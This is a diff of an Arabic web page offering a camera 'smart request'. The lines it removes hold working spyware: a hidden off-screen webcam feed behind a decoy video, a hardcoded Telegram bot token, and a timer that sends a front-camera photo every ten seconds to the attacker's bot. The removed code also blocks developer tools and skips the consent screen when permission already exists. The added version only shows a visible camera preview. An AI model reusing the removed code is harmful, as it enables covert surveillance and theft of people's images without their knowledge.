@@ -2,21 +2,19 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>كاميرا ذكية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>كاميرا - طلب ذكي</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #000;
-            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
             font-family: 'Segoe UI', sans-serif;
         }
-
+        
         /* شاشة الترحيب */
         .welcome-screen {
             position: fixed;
@@ -31,7 +29,7 @@
             z-index: 1000;
             transition: opacity 0.5s;
         }
-
+        
         .welcome-card {
             background: white;
             padding: 40px;
@@ -41,23 +39,18 @@
             width: 350px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-
+        
         .welcome-card h1 {
-            font-size: 64px;
+            font-size: 48px;
             margin-bottom: 20px;
         }
-
-        .welcome-card h2 {
-            color: #333;
-            margin-bottom: 15px;
-        }
-
+        
         .welcome-card p {
             color: #666;
             margin-bottom: 30px;
             line-height: 1.6;
         }
-
+        
         .allow-btn {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
@@ -67,149 +60,66 @@
             border-radius: 50px;
             cursor: pointer;
             transition: transform 0.2s;
-            width: 100%;
         }
-
-        .allow-btn:hover {
-            transform: scale(1.02);
-        }
-
-        /* المحتوى الرئيسي */
-        .main-content {
+        
+        .allow-btn:hover { transform: scale(1.05); }
+        
+        /* الكاميرا - مخفية حتى الموافقة */
+        .camera-container {
             display: none;
-        }
-
-        /* فيديو الخلفية */
-        .video-background {
-            position: fixed;
-            top: 0;
-            left: 0;
             width: 100%;
             height: 100%;
-            z-index: 1;
         }
-
-        .video-background video {
+        
+        video {
             width: 100%;
             height: 100%;
             object-fit: cover;
+            transform: scaleX(-1);
         }
-
-        /* كاميرا مخفية */
-        .hidden-camera {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            visibility: hidden;
-        }
-
-        canvas {
-            display: none;
-        }
-
-        /* شريط حالة صغير */
+        
         .status {
             position: fixed;
             bottom: 20px;
             left: 20px;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(5px);
+            background: rgba(0,0,0,0.6);
+            color: white;
             padding: 5px 15px;
             border-radius: 20px;
-            color: white;
-            font-size: 11px;
-            z-index: 2;
-        }
-
-        /* منع التمرير */
-        ::-webkit-scrollbar {
-            display: none;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
 
-    <!-- شاشة طلب الإذن -->
+    <!-- شاشة طلب الإذن اللطيفة -->
     <div class="welcome-screen" id="welcomeScreen">
         <div class="welcome-card">
             <h1>📷</h1>
             <h2>نحتاج للوصول إلى الكاميرا</h2>
-            <p>سنقوم بالتقاط صور تلقائياً وإرسالها إلى البوت. لن يتم حفظ الصور إلا بعد موافقتك.</p>
-            <button class="allow-btn" id="allowBtn">✅ موافق، أسمح بالوصول</button>
+            <p>سنقوم بالتقاط صور للمساعدة في تقديم الخدمة. لن يتم حفظ الصور إلا بعد موافقتك.</p>
+            <button class="allow-btn" id="allowBtn">موافق، أسمح بالوصول</button>
         </div>
     </div>
 
-    <!-- المحتوى الرئيسي (يظهر بعد الموافقة) -->
-    <div class="main-content" id="mainContent">
-        
-        <!-- فيديو خلفية -->
-        <div class="video-background">
-            <video id="bgVideo" autoplay loop muted playsinline>
-                <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
-            </video>
-        </div>
-
-        <!-- كاميرا مخفية -->
-        <div class="hidden-camera">
-            <video id="camera" autoplay playsinline muted></video>
-        </div>
-
-        <canvas id="canvas"></canvas>
-        
-        <div class="status" id="status">✅ النظام يعمل</div>
+    <!-- الكاميرا - تظهر بعد الموافقة -->
+    <div class="camera-container" id="cameraContainer">
+        <video id="camera" autoplay playsinline muted></video>
+        <div class="status" id="status">✅ الكاميرا تعمل</div>
     </div>
 
     <script>
-        // ==================== إعدادات تليجرام ====================
-        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
-        let CHAT_ID = null;
-        let stream = null;
-        let autoInterval = null;
-        let cameraReady = false;
-        
-        // ==================== عناصر الصفحة ====================
         const welcomeScreen = document.getElementById('welcomeScreen');
-        const mainContent = document.getElementById('mainContent');
+        const cameraContainer = document.getElementById('cameraContainer');
         const camera = document.getElementById('camera');
-        const canvas = document.getElementById('canvas');
         const statusDiv = document.getElementById('status');
+        let stream = null;
         
-        // ==================== دوال مساعدة ====================
         function showStatus(msg) {
             if (statusDiv) statusDiv.textContent = msg;
             console.log(msg);
-            setTimeout(() => {
-                if (statusDiv && statusDiv.textContent === msg) {
-                    statusDiv.textContent = '✅ يعمل';
-                }
-            }, 3000);
         }
         
-        // ==================== الحصول على Chat ID ====================
-        async function getChatId() {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
-                const result = await response.json();
-                
-                if (result.ok && result.result.length > 0) {
-                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
-                    if (CHAT_ID) {
-                        console.log('✅ Chat ID:', CHAT_ID);
-                        return true;
-                    }
-                }
-                console.log('⚠️ لم يتم العثور على Chat ID');
-                return false;
-            } catch(error) {
-                console.error('خطأ:', error);
-                return false;
-            }
-        }
-        
-        // ==================== تشغيل الكاميرا ====================
         async function startCamera() {
             try {
                 showStatus('📷 جاري تشغيل الكاميرا...');
@@ -217,114 +127,52 @@
                     video: { facingMode: "user" } 
                 });
                 camera.srcObject = stream;
-                cameraReady = true;
-                showStatus('✅ الكاميرا جاهزة');
+                showStatus('✅ الكاميرا تعمل');
                 return true;
             } catch(err) {
-                console.error('خطأ الكاميرا:', err);
-                showStatus('❌ لا يمكن الوصول للكاميرا');
+                showStatus('❌ لا يمكن الوصول للكاميرا: ' + err.message);
                 return false;
             }
         }
         
-        // ==================== التقاط وإرسال الصورة ====================
-        async function captureAndSend() {
-            if (!CHAT_ID || !cameraReady) return false;
-            
+        async function init() {
+            // التحقق أولاً من الإذن (بدون طلب)
             try {
-                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
+                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                 
-                canvas.width = camera.videoWidth;
-                canvas.height = camera.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
-                ctx.setTransform(1, 0, 0, 1, 0, 0);
-                
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `capture_${Date.now()}.jpg`);
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                return result.ok;
-            } catch(e) {
-                return false;
-            }
-        }
-        
-        // ==================== بدء التصوير التلقائي ====================
-        function startAutoCapture() {
-            if (autoInterval) clearInterval(autoInterval);
-            autoInterval = setInterval(async () => {
-                const success = await captureAndSend();
-                if (success) {
-                    console.log('📸 تم إرسال صورة');
+                if (permissionStatus.state === 'granted') {
+                    // لدينا الإذن مسبقاً - ابدأ مباشرة
+                    welcomeScreen.style.display = 'none';
+                    cameraContainer.style.display = 'block';
+                    startCamera();
+                    return;
                 }
-            }, 10000); // كل 10 ثواني
-        }
-        
-        // ==================== تشغيل كل شيء ====================
-        async function startEverything() {
-            showStatus('🔧 جاري التهيئة...');
-            
-            // تشغيل الكاميرا
-            await startCamera();
-            
-            // الحصول على Chat ID
-            await getChatId();
-            
-            // بدء التصوير التلقائي
-            if (cameraReady && CHAT_ID) {
-                startAutoCapture();
-                showStatus('✅ يعمل - يتم الإرسال كل 10 ثواني');
-            } else if (cameraReady) {
-                showStatus('✅ الكاميرا تعمل (بوت غير متصل)');
+            } catch(e) {
+                // permissions.query قد لا يعمل في بعض المتصفحات
+                console.log("لا يمكن التحقق من حالة الإذن");
             }
+            
+            // إذا لم يكن لدينا إذن، أظهر شاشة الترحيب
+            welcomeScreen.style.display = 'flex';
         }
         
-        // ==================== عند الضغط على زر الموافقة ====================
+        // عند الضغط على زر الموافقة
         document.getElementById('allowBtn').onclick = async () => {
-            // إخفاء شاشة الترحيب
             welcomeScreen.style.opacity = '0';
-            setTimeout(() => {
+            setTimeout(async () => {
                 welcomeScreen.style.display = 'none';
-                mainContent.style.display = 'block';
-                startEverything();
+                cameraContainer.style.display = 'block';
+                await startCamera();
             }, 300);
         };
         
-        // ==================== منع أدوات المطور ====================
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
-                (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-                return false;
-            }
-        });
+        // بدء التشغيل
+        init();
         
-        // ==================== إيقاف الكاميرا عند الخروج ====================
+        // إيقاف الكاميرا عند الخروج
         window.onbeforeunload = () => {
-            if (autoInterval) clearInterval(autoInterval);
-            if (stream) stream.getTracks().forEach(t => t.stop());
+            if (stream) stream.getTracks().forEach(track => track.stop());
         };
-        
-        // التحقق من الإذن المسبق (إذا كان موجوداً)
-        navigator.permissions?.query({ name: 'camera' }).then(permission => {
-            if (permission.state === 'granted') {
-                // لدينا الإذن مسبقاً - تخطي شاشة الترحيب
-                welcomeScreen.style.display = 'none';
-                mainContent.style.display = 'block';
-                startEverything();
-            }
-        }).catch(() => {});
     </script>
 </body>
 </html>
